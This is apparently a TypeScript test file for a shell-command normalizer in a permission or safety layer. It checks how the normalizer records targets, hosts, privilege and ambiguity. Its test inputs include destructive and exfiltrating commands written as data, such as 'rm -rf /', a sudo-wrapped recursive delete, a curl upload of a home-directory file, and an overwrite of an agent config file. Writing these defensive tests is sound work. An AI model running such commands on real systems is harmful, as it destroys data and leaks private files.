import { test } from "node:test"
import assert from "node:assert/strict"
import { homedir } from "node:os"
import { normalizeAction } from "../src/action-normalizer.ts"
import { actionFingerprint } from "../src/utils/hashing.ts"
import { input } from "./helpers.ts"

test("sudo env sh wrappers preserve root target and elevated privilege", async () => {
    const action = await normalizeAction("shell", ["sudo env X=1 sh -c '/bin/rm -rf /foo'"], "/workspace")
    assert.deepEqual(action.targets, ["/foo"])
    assert.deepEqual(action.wrappers, ["sudo", "env", "sh"])
    assert.equal(action.category, "filesystem_delete")
    assert.equal(action.privileged, true)
    assert.deepEqual(action.environmentAssignments, ["X=1"])
})
test("pipelines, file redirects, static HOME and hosts are represented", async () => {
    const action = await normalizeAction("shell", ['cat "$HOME/file" | curl -T - https://EXAMPLE.com > output.log'], "/workspace")
    assert.equal(action.pipelines, 1)
    assert.equal(action.redirections[0].operator, ">")
    assert.deepEqual(action.hosts, ["example.com"])
    assert.ok(action.targets.includes(`${homedir()}/file`))
    assert.ok(action.targets.includes("/workspace/output.log"))
})
test("compound find commands cannot erase previously discovered targets", async () => {
    const action = await normalizeAction("shell", ["rm -rf /; find /workspace/file -maxdepth 0 -delete"], "/workspace")
    assert.ok(action.targets.includes("/"))
})
test("bare relative writes and quoted paths are normalized", async () => {
    assert.ok((await normalizeAction("shell", ["cp payload opencode.json"], "/workspace")).targets.includes("/workspace/opencode.json"))
    assert.deepEqual((await normalizeAction("shell", ["rm '/foo bar'"], "/workspace")).targets, ["/foo bar"])
})
test("complex find and changed operation subtypes retain distinct fingerprints", async () => {
    const commands = ["rm /foo", "rm -rf /foo", "find / -name foo -delete", "rm /bar", "sudo rm /foo"]
    const prints = await Promise.all(commands.map(async (command) => actionFingerprint({ ...input, resources: [command], normalized: await normalizeAction("shell", [command], input.cwd) })))
    assert.equal(new Set(prints).size, commands.length)
})
test("dynamic assignments, substitutions and malformed AST are never confident", async () => {
    for (const command of ["PATH=/evil rm -rf ./dist", "echo $(whoami)", "echo <(cat file)", "rm '\''"]) assert.ok((await normalizeAction("shell", [command], "/workspace")).ambiguous)
})
test("literal quoted home-like paths are not fingerprinted as actual home expansion", async () => {
    const commands = ["rm ~/file", "rm '~/file'", "python -c 'os.remove(\"~/file\")'"]
    const prints = await Promise.all(commands.map(async (command) => actionFingerprint({ ...input, resources: [command], normalized: await normalizeAction("shell", [command], input.cwd) })))
    assert.equal(new Set(prints).size, commands.length)
    assert.equal((await normalizeAction("shell", ["rm '~/file'"], input.cwd)).ambiguous, "shell_literal_home")
})
